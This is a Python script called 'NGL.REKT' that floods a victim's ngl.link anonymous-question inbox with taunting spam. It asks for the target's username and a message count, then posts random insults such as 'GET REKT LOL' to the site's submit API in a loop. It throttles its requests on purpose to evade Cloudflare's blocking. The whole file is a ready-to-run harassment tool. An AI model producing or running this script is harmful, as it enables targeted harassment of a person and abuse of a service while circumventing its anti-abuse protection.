import requests
import random
import time
import os
from pystyle import Colors, Colorate # pystyle - Made by billythegoat356 - https://github.com/billythegoat356/pystyle

print('checking deps...')
os.system('pip3 install pystyle')
os.system('cls')
print(Colors.blue + """
 ███▄    █   ▄████  ██▓          ██▀███  ▓█████  ██ ▄█▀▄▄▄█████▓
 ██ ▀█   █  ██▒ ▀█▒▓██▒         ▓██ ▒ ██▒▓█   ▀  ██▄█▒ ▓  ██▒ ▓▒
▓██  ▀█ ██▒▒██░▄▄▄░▒██░         ▓██ ░▄█ ▒▒███   ▓███▄░ ▒ ▓██░ ▒░
▓██▒  ▐▌██▒░▓█  ██▓▒██░         ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ ░ ▓██▓ ░ 
▒██░   ▓██░░▒▓███▀▒░██████▒ ██▓ ░██▓ ▒██▒░▒████▒▒██▒ █▄  ▒██▒ ░ 
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░▓  ░ ▒▓▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒  ▒ ░░   
░ ░░   ░ ▒░  ░   ░ ░ ░ ▒  ░ ░▒    ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░    ░    
   ░   ░ ░ ░ ░   ░   ░ ░    ░     ░░   ░    ░   ░ ░░ ░   ░      
         ░       ░     ░  ░  ░     ░        ░  ░░  ░            
                             ░                                  
""")
print('')
print(Colors.red + 'NGL.REKT v1.0.0 by F4r9 ----')
print(Colorate.Horizontal(Colors.yellow_to_red, 'https://github.com/Xp3rtA/nglflooder', 1))
time.sleep(3)
os.system('cls')
count = (1)
options = input("Type 'y' to activate the custom waiting time between sending questions, else type 'n' > ")
if options == "y":
    count = input('Custom Waiting Time (PLEASE NOTE; ngl is protected by cloudflare!) > ')
os.system('cls')
url = "https://ngl.link/api/submit"
username = input("Please enter victim's username > ")
number = input("Please enter the number of questions (20 is recommended as it is under cloudflare) > ")
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
os.system('cls')
for i in range(int(number)):
    words = ["Get Flooded x)", "ASAP please clean your ngl x)", "GET REKT LOL", "tell me when your ngl account got flooded" ,"Yooooo did you got flooded????? x)", "flooded, xoxo", "GetRektByNGL.REKTteam:)GetRektByNGL.REKTteam:)GetRektByNGL.REKTteam:)GetRektByNGL.REKTteam:)", "gEt FlOoDeD lOl", "flooded by ngl.rekt"]
    data = "username=" + username +"&question=" + random.choice(words) + "&deviceId=&gameSlug=&referrer="
    try:
        r = requests.post(url, data=data, headers=headers)
        if "cloudflare" in r.text:
            print(Colorate.Horizontal(Colors.red_to_yellow, '[ERROR] - !! CLOUDFLARE ERROR !! (Sending Blocked)  ', 1))
        else:
            print(Colorate.Horizontal(Colors.green_to_blue, '[SENT] - Response:  ' + r.text, 1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow, '[ERROR] - This is surely due to a question sending error. ', 1))
    time.sleep(int(count)) # To make human-like requests, prevent cloudflare from blocking it

## Code made by F4r9
## You are authorized to modify, but please give at least attribution to the original code.